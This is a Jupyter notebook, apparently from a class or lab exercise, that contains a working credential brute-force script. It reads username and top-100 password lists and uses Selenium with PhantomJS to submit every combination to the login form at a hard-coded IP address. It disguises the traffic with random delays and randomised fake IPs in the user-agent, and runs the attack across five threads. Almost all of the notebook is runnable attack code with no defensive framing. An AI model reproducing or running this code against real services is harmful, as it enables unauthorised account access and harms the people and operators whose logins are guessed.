{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Libraries"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.desired_capabilities import DesiredCapabilities\n",
    "from selenium.webdriver.common.action_chains import ActionChains\n",
    "from bs4 import BeautifulSoup\n",
    "from datetime import datetime\n",
    "import getpass\n",
    "import json, time, os, re, random"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Import data - username & password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# import username list\n",
    "inputFn = \"bad_username.txt\"\n",
    "with open(inputFn) as inputFileHandle:\n",
    "    bad_username = inputFileHandle.readlines()\n",
    "user_list = []\n",
    "for user in bad_username:\n",
    "    user_list.append(user.replace('\\n',''))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# import password list\n",
    "inputFn = \"password_top_100\"\n",
    "with open(inputFn) as inputFileHandle:\n",
    "    password_top_100 = inputFileHandle.readlines()\n",
    "pwd_list = []\n",
    "for pwd in password_top_100:\n",
    "    pwd_list.append(pwd.replace('\\n',''))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Add datalab to the lists\n",
    "user_list.append(\"datalab\")\n",
    "# Remove repeted values in userlist\n",
    "user_list = list(set(user_list))\n",
    "pwd_list.append(\"datalab\")\n",
    "# URL\n",
    "url = 'http://31.14.135.81:3000/'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Attack funtion"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def attaque_rapide(url,liste_login,liste_password,random_time=0):\n",
    "    ip = str(random.randint(0, 255)) + '.' + str(random.randint(0, 255)) + '.' + str(random.randint(0, 255)) + '.' + str(random.randint(0, 255)) \n",
    "    for index,password in enumerate(liste_password):\n",
    "        for index2,username in enumerate(liste_login):\n",
    "            dcap = dict(DesiredCapabilities.PHANTOMJS)\n",
    "            dcap['phantomjs.page.settings.userAgent'] = username+' '+password+' '+ip+' 1'+' Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36'\n",
    "            if random_time > 10 :\n",
    "                time_sleep = random.randint(10, random_time)\n",
    "                print (\"Attend \"+ str(time_sleep) + ' secondes')\n",
    "                time.sleep(time_sleep)\n",
    "            else:\n",
    "                time.sleep(random.random() + 1)\n",
    "            browser = webdriver.PhantomJS(desired_capabilities=dcap)\n",
    "            time.sleep(0.5)\n",
    "            browser.get(url)\n",
    "                \n",
    "            login = browser.find_element_by_name(\"pseudo\")\n",
    "            login.send_keys(str(username))\n",
    "            login = browser.find_element_by_name(\"pwd\")\n",
    "            login.send_keys(str(password))\n",
    "            \n",
    "            browser.find_element_by_tag_name('button').click()\n",
    "            if index2 + 1 == str(len(liste_login)):\n",
    "                print('Threading :',threading.current_thread().name,' Login number :',index2 + 1,'/',str(len(liste_login)), ', login :',username,' Password number :',index + 1,'/',str(len(liste_password)) ,'pwd :',password,'\\n')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Single thread attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# attaque_rapide(url, user_list, pwd_list)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Multi-thread attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time, threading\n",
    "\n",
    "len_l = len(user_list)\n",
    "len_p = len(pwd_list)\n",
    "# Each thread try 1/5 of combinations\n",
    "attack_1 = threading.Thread(target = attaque_rapide, args=(url, user_list[:int(len_l/5)], pwd_list), name='attack_1')\n",
    "attack_2 = threading.Thread(target = attaque_rapide, args=(url, user_list[int(len_l/5):int(len_l/5)*2], pwd_list), name='attack_2')\n",
    "attack_3 = threading.Thread(target = attaque_rapide, args=(url, user_list[int(len_l/5)*2:int(len_l/5)*3], pwd_list), name='attack_3')\n",
    "attack_4 = threading.Thread(target = attaque_rapide, args=(url, user_list[int(len_l/5)*3:int(len_l/5)*4], pwd_list), name='attack_4')\n",
    "attack_5 = threading.Thread(target = attaque_rapide, args=(url, user_list[int(len_l/5)*4:], pwd_list), name='attack_5')\n",
    "\n",
    "attack_1.start()\n",
    "attack_2.start()\n",
    "attack_3.start()\n",
    "attack_4.start()\n",
    "attack_5.start()\n",
    "\n",
    "attack_1.join()\n",
    "attack_2.join()\n",
    "attack_3.join()\n",
    "attack_4.join()\n",
    "attack_5.join()"
   ]
  }
 ],
 "metadata": {
  "anaconda-cloud": {},
  "kernelspec": {
   "display_name": "Python [default]",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
